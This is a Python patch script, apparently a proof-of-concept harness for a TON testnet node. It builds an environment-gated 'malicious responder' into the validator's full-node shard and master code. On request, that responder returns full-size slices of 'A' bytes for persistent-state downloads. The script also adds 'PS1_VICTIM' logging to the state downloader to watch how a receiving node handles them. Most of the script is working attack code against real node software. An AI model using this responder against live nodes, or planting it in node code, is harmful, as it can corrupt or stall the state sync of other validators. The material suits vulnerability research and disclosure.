from pathlib import Path

root = Path("/home/a1/ton-testnet-current")

def path(rel):
    return root / rel

def read(rel):
    return path(rel).read_text()

def write(rel, text):
    path(rel).write_text(text)

def replace_once(rel, old, new, marker):
    p = path(rel)
    s = p.read_text()
    if marker in s:
        print(f"SKIP already patched: {rel} marker={marker}")
        return
    if old not in s:
        raise SystemExit(f"ANCHOR NOT FOUND in {rel}:\n{old[:300]}")
    p.write_text(s.replace(old, new, 1))
    print(f"PATCHED {rel}: {marker}")

def insert_after_once(rel, anchor, insert, marker):
    p = path(rel)
    s = p.read_text()
    if marker in s:
        print(f"SKIP already patched: {rel} marker={marker}")
        return
    if anchor not in s:
        raise SystemExit(f"INCLUDE ANCHOR NOT FOUND in {rel}: {anchor!r}")
    p.write_text(s.replace(anchor, anchor + insert, 1))
    print(f"PATCHED include {rel}: {marker}")

# -------------------------
# Attacker-only malicious responder
# -------------------------

insert_after_once(
    "validator/full-node-shard.cpp",
    '#include "overlays.h"\n',
    "\n#include <cstdlib>\n",
    "TON_POC_MALICIOUS_STATE_SLICE",
)

replace_once(
    "validator/full-node-shard.cpp",
    '''  if (query.max_size_ < 0 || query.max_size_ > (1 << 24)) {
    promise.set_error(td::Status::Error(ErrorCode::protoviolation, "invalid max_size"));
    return;
  }
  auto P = td::PromiseCreator::lambda(
''',
    '''  if (query.max_size_ < 0 || query.max_size_ > (1 << 24)) {
    promise.set_error(td::Status::Error(ErrorCode::protoviolation, "invalid max_size"));
    return;
  }
  if (std::getenv("TON_POC_MALICIOUS_STATE_SLICE") != nullptr) {
    LOG(ERROR) << "PS1_ATTACKER shard got_downloadPersistentStateSliceV2 src=" << src
               << " offset=" << query.offset_ << " max_size=" << query.max_size_;
    td::BufferSlice data{static_cast<size_t>(query.max_size_)};
    data.as_slice().fill('A');
    LOG(ERROR) << "PS1_ATTACKER shard sent_full_slice offset=" << query.offset_
               << " size=" << data.size();
    promise.set_value(std::move(data));
    return;
  }
  auto P = td::PromiseCreator::lambda(
''',
    "PS1_ATTACKER shard got_downloadPersistentStateSliceV2",
)

# Master responder is optional; patch it if the current file has the expected function.
master = path("validator/full-node-master.cpp")
if master.exists():
    s = master.read_text()
    if "PS1_ATTACKER master got_downloadPersistentStateSliceV2" not in s:
        if '#include "full-node-shard-queries.hpp"\n' in s:
            s = s.replace(
                '#include "full-node-shard-queries.hpp"\n',
                '#include "full-node-shard-queries.hpp"\n\n#include <cstdlib>\n',
                1,
            )
        master_anchor = '''void FullNodeMasterImpl::process_query(adnl::AdnlNodeIdShort src,
                                       ton_api::tonNode_downloadPersistentStateSliceV2 &query,
                                       td::Promise<td::BufferSlice> promise) {
'''
        if master_anchor in s:
            s = s.replace(
                master_anchor,
                master_anchor + '''  if (std::getenv("TON_POC_MALICIOUS_STATE_SLICE") != nullptr && query.max_size_ > 0 && query.max_size_ <= (1 << 24)) {
    LOG(ERROR) << "PS1_ATTACKER master got_downloadPersistentStateSliceV2 src=" << src
               << " offset=" << query.offset_ << " max_size=" << query.max_size_;
    td::BufferSlice data{static_cast<size_t>(query.max_size_)};
    data.as_slice().fill('A');
    LOG(ERROR) << "PS1_ATTACKER master sent_full_slice offset=" << query.offset_
               << " size=" << data.size();
    promise.set_value(std::move(data));
    return;
  }
''',
                1,
            )
            master.write_text(s)
            print("PATCHED validator/full-node-master.cpp: PS1_ATTACKER master")
        else:
            print("WARN: master persistent-state slice function anchor not found; skipped master patch")

# -------------------------
# Victim logging only. No force path, no env, no artificial DownloadState start.
# -------------------------

replace_once(
    "validator/net/download-state.cpp",
    '''void DownloadState::got_block_state_part(td::BufferSlice data, td::uint32 requested_size) {
  bool last_part = data.size() < requested_size;
  sum_ += data.size();
  parts_.push_back(std::move(data));

''',
    '''void DownloadState::got_block_state_part(td::BufferSlice data, td::uint32 requested_size) {
  auto ps1_data_size = data.size();
  auto ps1_sum_before = sum_;
  bool last_part = data.size() < requested_size;
  sum_ += data.size();
  parts_.push_back(std::move(data));

  if (ps1_data_size > 0 || requested_size > 0) {
    LOG(ERROR) << "PS1_VICTIM part_received requested_size=" << requested_size
               << " data_size=" << ps1_data_size
               << " sum_before=" << ps1_sum_before
               << " sum_after=" << sum_
               << " parts=" << parts_.size()
               << " total_size=" << total_size_
               << " last_part=" << last_part
               << " download_from=" << download_from_;
  }

''',
    "PS1_VICTIM part_received",
)

replace_once(
    "validator/net/download-state.cpp",
    '''  if (last_part) {
    status_.set_status(PSTRING() << block_id_.id << " : " << sum_ << " bytes, finishing");
''',
    '''  if (last_part) {
    LOG(ERROR) << "PS1_VICTIM eof_copy sum=" << sum_
               << " parts=" << parts_.size();
    status_.set_status(PSTRING() << block_id_.id << " : " << sum_ << " bytes, finishing");
''',
    "PS1_VICTIM eof_copy",
)

replace_once(
    "validator/net/download-state.cpp",
    '''  td::BufferSlice query = create_serialize_tl_object<ton_api::tonNode_downloadPersistentStateSliceV2>(
      create_tl_object<ton_api::tonNode_persistentStateIdV2>(
          create_tl_block_id(block_id_), create_tl_block_id(masterchain_block_id_), effective_shard_),
      sum_, part_size);
  if (client_.empty()) {
''',
    '''  td::BufferSlice query = create_serialize_tl_object<ton_api::tonNode_downloadPersistentStateSliceV2>(
      create_tl_object<ton_api::tonNode_persistentStateIdV2>(
          create_tl_block_id(block_id_), create_tl_block_id(masterchain_block_id_), effective_shard_),
      sum_, part_size);
  LOG(ERROR) << "PS1_VICTIM next_request offset=" << sum_
             << " part_size=" << part_size << " peer=" << download_from_;
  if (client_.empty()) {
''',
    "PS1_VICTIM next_request",
)

print("PS1_NAT_MINIMAL_ANCHOR_PATCH_OK")
